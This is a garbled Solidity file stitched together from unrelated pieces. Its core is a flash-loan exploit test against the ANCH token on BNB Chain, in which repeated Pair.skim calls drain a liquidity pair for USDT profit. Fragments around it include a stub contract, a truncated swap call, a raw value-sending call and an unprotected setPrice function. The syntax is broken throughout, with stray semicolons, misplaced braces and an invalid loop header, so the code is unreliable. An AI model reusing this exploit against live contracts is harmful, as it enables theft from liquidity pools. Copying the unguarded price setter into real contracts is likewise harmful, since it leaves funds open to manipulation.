
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity ^0.8.10;

```solidity;

;
;
contract ContractTest is DSTest{
    IERC20 ANCH = IERC20(0xA4f5d4aFd6b9226b3004dD276A9F778EB75f2e9e);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xaD0dA05b9C20fa541012eE2e89AC99A864CC68Bb);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address dodo = 0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("bsc", 20302534)};
    function testExploit() public{
        USDT.approve(address(Router), type(uint).max);
        ANCH.approve(address(Router), type(uint).max);
        DVM(dodo).flashLoan(0, 50_000 * 1e18, address(this), new bytes(1));
        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit",
            USDT.balanceOf(address(this)),;
            18)};
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{
        buyANCH();
        ANCH.transfer(address(Pair), ANCH.balanceOf(address(this)));
        for (uint index = 0, index < 60, index++) {
            Pair.skim(address(Pair))};
        Pair.skim(address(this));
        sellANCH();
        USDT.transfer(dodo, 50_000 * 1e18)};
    function buyANCH() internal {
        address [] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(ANCH);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(USDT.balanceOf(address(this)),;
            0,;
            path,;
            address(this),;
            block.timestamp)};
    function sellANCH() internal {
        address [] memory path = new address[](2);
        path[0] = address(ANCH);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransfer
function sendETH(address recipient, uint256 value) public {
    (bool ok, ) = address(bytes20(recipient)).call{value: value}(abi.encodePacked("data"));
    require(ok)}
function setPrice(uint newPrice) public {
    price = newPrice}